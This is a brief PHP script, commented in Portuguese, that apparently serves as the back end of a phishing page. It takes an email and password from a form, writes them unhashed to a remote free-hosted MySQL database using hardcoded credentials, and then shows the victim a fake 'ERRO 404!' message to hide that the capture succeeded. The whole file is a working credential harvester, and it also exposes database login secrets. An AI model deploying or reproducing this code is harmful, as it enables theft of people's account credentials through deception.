<?php 
    // Configurações do banco de dados
    $host = "sql10.freesqldatabase.com";
    $user = "sql10730363";
    $pass = "8vrhEXhLAq";
    $db = "sql10730363";
    $port = 3306;

    // Criar conexão
    $conn = mysqli_connect($host, $user, $pass, $db, $port);

    // Verificar a conexão
    if (!$conn) {
        die("Conexão falhou: " . mysqli_connect_error());
    }

    // Obter dados do POST
    $email = $_POST["email"];
    $senha = $_POST["password"];

    // Preparar a consulta SQL
    $sql = "INSERT INTO usuarios (email, senha) VALUES (?, ?)";
    $stmt = $conn->prepare($sql);

    if ($stmt === false) {
        die("Falha ao preparar a consulta: " . $conn->error);
    }

    // Vincular parâmetros e executar
    $stmt->bind_param("ss", $email, $senha);

    if ($stmt->execute()) {
        echo "ERRO 404!";
    } else {
        echo "Erro ao executar a consulta: " . $stmt->error;
    }

    // Fechar a instrução e a conexão
    $stmt->close();
    $conn->close();
?>


                    